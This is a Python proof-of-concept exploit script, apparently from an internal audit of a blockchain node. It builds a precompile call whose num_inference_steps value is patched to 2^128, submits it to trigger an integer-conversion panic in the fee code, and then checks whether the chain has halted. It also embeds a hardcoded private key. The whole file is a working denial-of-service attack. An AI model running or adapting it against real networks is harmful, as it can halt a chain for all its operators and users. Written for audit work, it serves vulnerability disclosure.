#!/usr/bin/env python3
"""
C1 Chain-Halt PoC — ritual-async-fees multimodal precompile panic

Target:  ritual-reth-internal/crates/ritual-async-fees/src/lib.rs:906
Vuln:    U256::from_be_slice(steps_word).to::<u128>()
         ruint's .to::<u128>() panics if value > u128::MAX
Impact:  Crashes both block builder AND all verifiers. Chain halts.

Exploit path:
  1. Deposit ETH into RitualWallet (required for async precompile fee escrow)
  2. Build a valid ImageCallRequest (passes all mempool validation)
  3. Patch the raw ABI bytes: set num_inference_steps word to 2^128
  4. Submit via PrecompileConsumer.callImageCall(patched_bytes)
  5. When Phase 2 fee calculation runs, extract_output_ux_params_from_input() panics

Usage:
    cd /home/ritual/repos/traffic-gen-internal
    PYTHONPATH=src .venv/bin/python3 ../sjs-agent-sessions/chain-halt-audit/c1_halt_poc.py
"""

import asyncio
import sys

from eth_account import Account
from web3 import AsyncWeb3
from web3.middleware import async_geth_poa_middleware

# Pull ritual_common from traffic-gen's lib (same as traffic-gen uses)
from ritual_common import RITUAL_WALLET_CONTRACT_ADDRESS, PRECOMPILE_CONSUMER_CONTRACT_ADDRESS
from ritual_common.image_call import ImageCallRequest

RPC_URL    = "http://localhost:8545"
FAUCET_KEY = "0xb21e915e5b3fcbddb87c5e5dd69fcfe089c046931dac43983dfe577d6c4b1d7a"

# Registered IMAGE_CALL (Capability=7) executor on this local network.
# From: TEEServiceRegistry.getServicesByCapability(7, False)
IMAGE_EXECUTOR = "0x3aa407849A31b86C8693817724555F5005B87A2a"

# Panic-site constants (ritual-async-fees/src/lib.rs:749-756)
MULTIMODAL_OUTPUT_WORD_INDEX   = 16  # word 16 in ABI head = offset to OutputConfig
OUTPUT_CONFIG_STEPS_WORD_INDEX = 5   # word 5 within OutputConfig = num_inference_steps

# Minimal RitualWallet ABI (just deposit)
RITUAL_WALLET_ABI = [
    {
        "name": "deposit",
        "type": "function",
        "inputs": [{"name": "lockDuration", "type": "uint256"}],
        "outputs": [],
        "stateMutability": "payable",
    },
    {
        "name": "balanceOf",
        "type": "function",
        "inputs": [{"name": "user", "type": "address"}],
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "view",
    },
]

# Minimal PrecompileConsumer ABI (just callImageCall)
RITUAL_WALLET_LOCK_ABI = [
    {
        "name": "lockUntil",
        "type": "function",
        "inputs": [{"name": "user", "type": "address"}],
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "view",
    },
]

PRECOMPILE_CONSUMER_ABI = [
    {
        "name": "callImageCall",
        "type": "function",
        "inputs": [{"name": "input", "type": "bytes"}],
        "outputs": [{"name": "", "type": "bytes"}],
        "stateMutability": "nonpayable",
    },
]


def build_malicious_precompile_input() -> bytes:
    """
    Build ABI-encoded ImageCall precompile input with steps > u128::MAX.

    Uses ImageCallRequest.to_web3() for correct encoding (passes all mempool
    validation), then patches the num_inference_steps word in raw bytes.

    The patch targets bytes at:
        output_config_offset + OUTPUT_CONFIG_STEPS_WORD_INDEX * 32
    where output_config_offset is read from word 16 of the encoded output.
    """
    request = ImageCallRequest(
        executor=IMAGE_EXECUTOR,
        encrypted_secrets=[],
        secret_signature=[],
        user_public_key=b"",
        ttl=100,
        poll_interval_blocks=1,
        max_poll_block=500,
        task_id_marker="C1_POC",
        delivery_target="0x0000000000000000000000000000000000000000",
        delivery_selector=b"\x00\x00\x00\x00",
        delivery_gas_limit=500_000,
        delivery_max_fee_per_gas=1_000_000_000,
        delivery_max_priority_fee_per_gas=100_000_000,
        delivery_value=0,
        model="mock-image-model",
        prompt="a cat",
        width=512,
        height=512,
        encrypted_storage_payment=b"",
        num_inference_steps=0,   # valid value — will be patched below
        guidance_scale=0,
        seed=0,
        negative_prompt="",
    )

    encoded = bytearray(request.to_web3())

    # Read OutputConfig offset from word 16 of the ABI head
    output_config_offset = int.from_bytes(
        encoded[MULTIMODAL_OUTPUT_WORD_INDEX * 32 : MULTIMODAL_OUTPUT_WORD_INDEX * 32 + 32],
        "big",
    )

    # Patch word 5 of OutputConfig to 2^128 (one above u128::MAX)
    # This is the exact value that triggers: U256::from_be_slice(steps_word).to::<u128>()
    steps_offset = output_config_offset + OUTPUT_CONFIG_STEPS_WORD_INDEX * 32
    malicious_steps = (2**128).to_bytes(32, "big")
    encoded[steps_offset : steps_offset + 32] = malicious_steps

    return bytes(encoded)


async def send_tx(w3: AsyncWeb3, tx: dict, private_key: str) -> str:
    """Sign and send a transaction, return hex tx hash."""
    acct = Account.from_key(private_key)
    chain_id = await w3.eth.chain_id
    nonce = await w3.eth.get_transaction_count(acct.address)
    block = await w3.eth.get_block("latest")
    base_fee = block["baseFeePerGas"]
    priority_fee = w3.to_wei(1, "gwei")

    tx = {
        **tx,
        "from": acct.address,
        "nonce": nonce,
        "chainId": chain_id,
        "maxFeePerGas": base_fee * 2 + priority_fee,
        "maxPriorityFeePerGas": priority_fee,
    }

    signed = w3.eth.account.sign_transaction(tx, private_key)
    raw = signed.rawTransaction if hasattr(signed, "rawTransaction") else signed.raw_transaction
    tx_hash = await w3.eth.send_raw_transaction(raw)
    return tx_hash.hex()


async def check_chain(w3: AsyncWeb3, label: str = "") -> bool:
    try:
        block = await asyncio.wait_for(w3.eth.block_number, timeout=5)
        print(f"  [chain alive{' ' + label if label else ''}] block={block}")
        return True
    except Exception as e:
        print(f"  [chain dead{' ' + label if label else ''}] {e}")
        return False


async def main():
    w3 = AsyncWeb3(AsyncWeb3.AsyncHTTPProvider(RPC_URL))
    w3.middleware_onion.inject(async_geth_poa_middleware, layer=0)

    chain_id = await w3.eth.chain_id
    block = await w3.eth.block_number
    print(f"[+] Connected  chain_id={chain_id}  block={block}")

    acct = Account.from_key(FAUCET_KEY)
    eth_balance = await w3.eth.get_balance(acct.address)
    print(f"[+] Sender:    {acct.address}")
    print(f"[+] ETH:       {eth_balance / 1e18:.4f} ETH")

    # --- Step 1: Deposit into RitualWallet ---
    ritual_wallet = w3.eth.contract(
        address=w3.to_checksum_address(RITUAL_WALLET_CONTRACT_ADDRESS),
        abi=RITUAL_WALLET_ABI,
    )

    ritual_wallet_lock = w3.eth.contract(
        address=w3.to_checksum_address(RITUAL_WALLET_CONTRACT_ADDRESS),
        abi=RITUAL_WALLET_ABI + RITUAL_WALLET_LOCK_ABI,
    )
    ritual_balance = await ritual_wallet_lock.functions.balanceOf(acct.address).call()
    lock_until = await ritual_wallet_lock.functions.lockUntil(acct.address).call()
    current_block = await w3.eth.block_number
    print(f"[+] RitualWallet balance: {ritual_balance / 1e18:.4f} ETH  lockUntil={lock_until} (current={current_block})")

    if ritual_balance < w3.to_wei(0.5, "ether") or lock_until < current_block + 200:
        print("[*] Depositing 1 ETH into RitualWallet...")
        # Lock duration must exceed the job's TTL; traffic-gen defaults to 100M blocks
        deposit_data = await ritual_wallet.functions.deposit(100_000_000).build_transaction({
            "value": w3.to_wei(1, "ether"),
        })
        tx_hash = await send_tx(w3, deposit_data, FAUCET_KEY)
        print(f"    deposit tx: {tx_hash}")
        receipt = await w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
        print(f"    deposit mined in block {receipt['blockNumber']}, status={receipt['status']}")
        ritual_balance = await ritual_wallet_lock.functions.balanceOf(acct.address).call()
        print(f"    new RitualWallet balance: {ritual_balance / 1e18:.4f} ETH")
    else:
        print("[*] RitualWallet already funded — skipping deposit")

    # --- Step 2: Build malicious calldata ---
    precompile_input = build_malicious_precompile_input()

    # Verify the patch
    output_offset = int.from_bytes(
        precompile_input[MULTIMODAL_OUTPUT_WORD_INDEX * 32 : MULTIMODAL_OUTPUT_WORD_INDEX * 32 + 32],
        "big",
    )
    steps_word = int.from_bytes(
        precompile_input[output_offset + OUTPUT_CONFIG_STEPS_WORD_INDEX * 32 :
                         output_offset + OUTPUT_CONFIG_STEPS_WORD_INDEX * 32 + 32],
        "big",
    )
    print(f"\n[*] Precompile input: {len(precompile_input)} bytes")
    print(f"[*] OutputConfig offset: {output_offset}")
    print(f"[*] steps_word = {steps_word}")
    print(f"[*] steps > u128::MAX: {steps_word > 2**128 - 1}  ← triggers ruint .to::<u128>() panic")

    # --- Step 3: Send via PrecompileConsumer.callImageCall ---
    consumer = w3.eth.contract(
        address=w3.to_checksum_address(PRECOMPILE_CONSUMER_CONTRACT_ADDRESS),
        abi=PRECOMPILE_CONSUMER_ABI,
    )

    await check_chain(w3, "before tx")

    print(f"\n[*] Sending malicious ImageCall tx via PrecompileConsumer...")
    image_tx = await consumer.functions.callImageCall(precompile_input).build_transaction({
        "gas": 800_000,
    })

    try:
        tx_hash = await send_tx(w3, image_tx, FAUCET_KEY)
        print(f"[+] Tx sent: {tx_hash}")
    except Exception as e:
        print(f"[!] send_raw_transaction failed: {e}")
        return 1

    # --- Step 4: Wait for receipt (chain halt = no receipt) ---
    print("[*] Waiting for receipt (30s timeout — halt expected if panic triggered)...")
    try:
        receipt = await asyncio.wait_for(
            w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30),
            timeout=35,
        )
        print(f"[!] Receipt received: block={receipt['blockNumber']}, status={receipt['status']}")
        if receipt["status"] == 0:
            print("    Tx reverted — panic site not reached (possibly filtered before Phase 2)")
        else:
            print("    Tx succeeded — job submitted, panic will trigger at Phase 2 settlement")
    except (asyncio.TimeoutError, Exception) as e:
        if "TimeExhausted" in type(e).__name__ or "not in the chain" in str(e):
            print("[!] TIMEOUT — no receipt after 30s (chain may have halted)")
        else:
            raise

    await check_chain(w3, "after tx")
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
